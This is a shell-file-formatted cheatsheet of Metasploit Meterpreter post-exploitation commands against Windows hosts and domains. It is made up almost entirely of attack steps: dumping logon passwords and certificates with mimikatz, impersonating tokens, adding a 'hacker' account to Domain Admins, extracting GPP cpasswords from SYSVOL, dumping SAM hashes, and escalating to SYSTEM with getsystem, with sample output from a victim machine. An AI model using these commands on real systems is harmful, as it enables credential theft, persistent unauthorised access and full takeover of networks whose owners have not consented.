#!/bin/sh


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Metasploit - Meterpreter Shell - Cheatsheet
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > load mimikatz
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > kerberos
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
## ---------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > msv				## [?] Your AD password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > livessp			## [?] Your Windows8 password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > ssp				## [?] Your outlook password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > tspkg		    ## [?] Your AD password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > wdigest			## [?] Your AD password
## ---------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::listStores
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::listCertificates
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::patchcapi
## ---------------------------------------------------------------------------------------------------- ##






## -------------------------------------------------------------------------- ##
     meterpreter > load mimikatz    ##  [?] 
     meterpreter > kerberos         ##  [?] 
     meterpreter > msv				##  [?] AD password
     meterpreter > livessp			##  [?] Windows8 password
     meterpreter > ssp				##  [?] outlook password
     meterpreter > tspkg			##  [?] AD password
     meterpreter > wdigest			##  [?] AD password
## -------------------------------------------------------------------------- ##
     meterpreter > msv				##  [?] AD password
     meterpreter > livessp			##  [?] Windows8 password
     meterpreter > ssp				##  [?] outlook password
     meterpreter > tspkg			##  [?] AD password
## -------------------------------------------------------------------------- ##
     meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
## -------------------------------------------------------------------------- ##



meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker $Pass -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10
meterpreter > getuid
meterpreter > shell


##-=======================================-##
##   [+] Metasploit - Post Exploitation
##-=======================================-##
meterpreter> sysinfo
meterpreter> run post/windows/gather/checkvm
meterpreter> run get_local_subnets


## ------------------------------------------------ ##
##   [?] Find Group Policy Preference XML files:
## ------------------------------------------------ ##
C:>findstr /S cpassword %logonserver%\sysvol\*.xml
meterpreter > post/windows/gather/credentials/gpp



##-======================================-##
##   [+] Meterpreter - Dump remote SAM:
##-======================================-##
meterpreter> run post/windows/gather/smart_hashdump



##-=========================================-##
##   [+] SamDump2 - Dump Remote SAM Hash:
##-=========================================-##
samdump2 -o out /mnt/ntfs/WINDOWS/system32/config/system /mnt/ntfs/WINDOWS/system32/config/sam


##-====================================-##
##   [+] Mimikatz - Dump SAM Hashes:
##-====================================-##
mimikatz_command -f samdump::hashes



meterpreter > getuid
## ------------------------------------------------ ##
##    Server username: win7-64-victim\Workshop
## ------------------------------------------------ ##



meterpreter > getsystem
## ------------------------------------------------ ##
##    ...got system (via technique 1).
## ------------------------------------------------ ##



meterpreter > getuid
## ------------------------------------------------ ##
##    Server username: NT AUTHORITY\SYSTEM
## ------------------------------------------------ ##


##-===========================================-##
##   [+] Meterpreter - Use Priv Esc Module:
##-===========================================-##
meterpreter > use priv
meterpreter > run post/windows/escalate/getsystem



